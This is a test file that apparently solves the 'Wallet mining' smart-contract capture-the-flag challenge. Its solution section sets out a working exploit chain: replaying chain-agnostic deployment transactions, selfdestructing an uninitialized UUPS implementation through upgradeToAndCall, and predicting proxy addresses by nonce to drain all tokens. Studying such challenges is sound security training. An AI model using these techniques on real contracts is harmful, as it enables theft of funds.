const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const { keccak256, toUtf8Bytes } = require("ethers/lib/utils");

describe("[Challenge] Wallet mining", function () {
  let deployer, player;
  let token, authorizer, walletDeployer;
  let initialWalletDeployerTokenBalance;

  const DEPOSIT_ADDRESS = "0x9b6fb606a9f5789444c17768c6dfcf2f83563801";
  const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, ward, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy authorizer with the corresponding proxy
    authorizer = await upgrades.deployProxy(
      await ethers.getContractFactory("AuthorizerUpgradeable", deployer),
      [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
      { kind: "uups", initializer: "init" }
    );

    expect(await authorizer.owner()).to.eq(deployer.address);
    expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
    expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

    // Deploy Safe Deployer contract
    walletDeployer = await (
      await ethers.getContractFactory("WalletDeployer", deployer)
    ).deploy(token.address);
    expect(await walletDeployer.chief()).to.eq(deployer.address);
    expect(await walletDeployer.gem()).to.eq(token.address);

    // Set Authorizer in Safe Deployer
    await walletDeployer.rule(authorizer.address);
    expect(await walletDeployer.mom()).to.eq(authorizer.address);

    await expect(
      walletDeployer.can(ward.address, DEPOSIT_ADDRESS)
    ).not.to.be.reverted;
    await expect(
      walletDeployer.can(player.address, DEPOSIT_ADDRESS)
    ).to.be.reverted;

    // Fund Safe Deployer with tokens
    initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
    await token.transfer(
      walletDeployer.address,
      initialWalletDeployerTokenBalance
    );

    // Ensure these accounts start empty
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq("0x");
    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq(
      "0x"
    );
    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq(
      "0x"
    );

    // Deposit large amount of DVT tokens to the deposit address
    await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

    // Ensure initial balances are set correctly
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
    expect(await token.balanceOf(walletDeployer.address)).eq(
      initialWalletDeployerTokenBalance
    );
    expect(await token.balanceOf(player.address)).eq(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    // to deploy code to the safe factory, we would either need to have access to the private key of the creator or we could replay the creation transaction if the tx doesn't involve chainId.
    // the tx's doesn't involve chainId. hence we could replay that to create the factory and the mastercopy. but the sender of these tx's must have some balance to send these tx's. since player has balance, we can transfer to the creator
    await player.sendTransaction({
      to: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A",
      value: ethers.utils.parseEther("10"),
    });
    const txs = require("./txs.json");
    await ethers.provider.sendTransaction(txs.tx1); // create safe
    await ethers.provider.sendTransaction(txs.tx2);
    await ethers.provider.sendTransaction(txs.tx3); // create factory

    expect(
      await ethers.provider.getCode(await walletDeployer.fact())
    ).to.not.eq("0x");

    expect(
      await ethers.provider.getCode(await walletDeployer.copy())
    ).to.not.eq("0x");

    // to take the tokens from the walletDeployer, there might be some error in the assembly code / some error in the authorizer contract. but to take funds from the deposit address, we must find a serving contract at that address. we can first check for the details of the deposit address. it could be created by the safe factory.

    // this address is created by the safe factory. since createProxy uses normal create call to create new proxies, we have to find at what count does this address emerge. with this we will have control over the deposit tokens. but since obtaining the walletFactory tokens as-it-is depends on the creation of this deposit contract we will look into that.

    // nonce check
    const expectedAddress = ethers.utils.getContractAddress({
      from: "0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b",
      nonce: 43,
    });
    expect(DEPOSIT_ADDRESS.toLowerCase()).to.eq(expectedAddress.toLowerCase());

    // the authorizerUpgradable doesn't seem to have any bugs on quick look. we will look into the assembly part. the can function will revert if the authorizer reverts,the authorizer returns 0 or the code size of authorizer is 0.
    // to change the return data from the call, we would have to update the implementation contract. but only the owner of the proxy would be able to do that. but since the implementation is uninitialized, we can use the upgradeToAndCall function to perform a delegatecall. with this we can destroy the contract after which the staticall will succeed with empty return data

    // so we will create a uups upgradable pattern compliant contract containing selfdestruct, init the authrization implementation and then upgradeAndCall to the malicious contract. Now looking at the deposit amount of proxy, we could have guessed the nonce. We will call the drop function of walletDeployer 42 times with 0 init data and on the 43rd, we will pass the init data to transfer the tokens to our address.

    // to get the address of the implementation, we can check the implementation slot of the proxy
    const implementationSlot =
      "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
    const implementationAddress =
      "0x" +
      (
        await ethers.provider.getStorageAt(
          authorizer.address,
          implementationSlot
        )
      ).slice(-40);
    console.log(implementationAddress);
    const walletMiningAttacker = await (
      await ethers.getContractFactory("WalletMiningAttacker", player)
    ).deploy(
      implementationAddress,
      walletDeployer.address,
      token.address,
      DEPOSIT_TOKEN_AMOUNT
    );

    await walletMiningAttacker.attackAuthorization();
    await walletMiningAttacker.attack();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Factory account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.fact())
    ).to.not.eq("0x");

    // Master copy account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.copy())
    ).to.not.eq("0x");

    // Deposit account must have code
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq("0x");

    // The deposit address and the Safe Deployer contract must not hold tokens
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
    expect(await token.balanceOf(walletDeployer.address)).to.eq(0);

    // Player must own all tokens
    expect(await token.balanceOf(player.address)).to.eq(
      initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)
    );
  });
});
